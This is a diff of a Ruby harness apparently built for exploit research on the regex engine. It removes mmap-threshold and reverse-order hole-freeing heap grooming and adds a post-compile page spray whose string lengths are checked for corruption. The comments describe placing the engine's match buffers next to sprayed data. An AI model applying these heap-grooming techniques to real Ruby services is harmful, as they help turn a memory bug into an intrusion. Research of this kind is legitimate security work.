@@ -29,34 +29,22 @@ begin
       # heap groom: small marker strings live in the brk heap, below the
       # engine's match-time allocations — the request-body grooming analog
       n, sz = Integer(groom[0]), Integer(groom[1])
-      # 1. raise glibc's dynamic mmap threshold (free one big mmap chunk) so
-      #    the engine's num_repeat-sized arrays go to the brk heap
-      if (rt = req['raise_threshold'])
-        big = 'T' * Integer(rt)
-        big = nil
-        GC.start
-      end
-      # 2. marker spray (brk heap)
       markers = Array.new(n) { 'M' * sz }
-      # 3. exact-size holes freed in order: first hole goes to the LAST
-      #    taker, so repeat_range lands above and repeat_stk directly on
-      #    top of the markers
-      if (holes = req['holes'])
-        chunks = holes.map { |h| 'H' * Integer(h) }
-        # free in REVERSE allocation order: unsorted-bin FIFO hands the
-        # oldest-freed chunk to the first taker, so repeat_range (compile
-        # time) gets the HIGHEST hole and repeat_stk (match time) reuses
-        # the LOWEST one, directly on top of the markers
-        chunks.length.downto(1) do |i|
-          chunks[i - 1] = nil
-          GC.start
-        end
-      end
       GC.start
     end
     t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
     re = Regexp.new(pattern)
     compile_ms = ((Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0) * 1000).round
+
+    # post-compile groom: plug the compile-freed mmap holes so the engine's
+    # combined match buffer (repeat_stk + stack) packs into fresh space,
+    # directly below the newest ruby heap page
+    fillers = req['fillers']&.map { |f| 'F' * Integer(f) }
+    sprayed = nil
+    if (ps = req['page_spray'])
+      sprayed = Array.new(Integer(ps)) { 'p' * 10 }
+      GC.start
+    end
     Regexp.timeout = Float(req['timeout']) if req['timeout']
     result = nil
     begin
@@ -79,6 +67,15 @@ begin
       out[:groom_hits] = hits
       out[:groom_total] = markers.size
     end
+    if sprayed
+      changed = []
+      sprayed.each_with_index do |s, i|
+        changed << { i: i, len: s.length } if s.length != 10
+      end
+      out[:page_hits] = changed
+      out[:page_total] = sprayed.size
+    end
+    fillers = nil
     puts JSON.generate(out)
   else
     warn "unknown mode #{mode}"
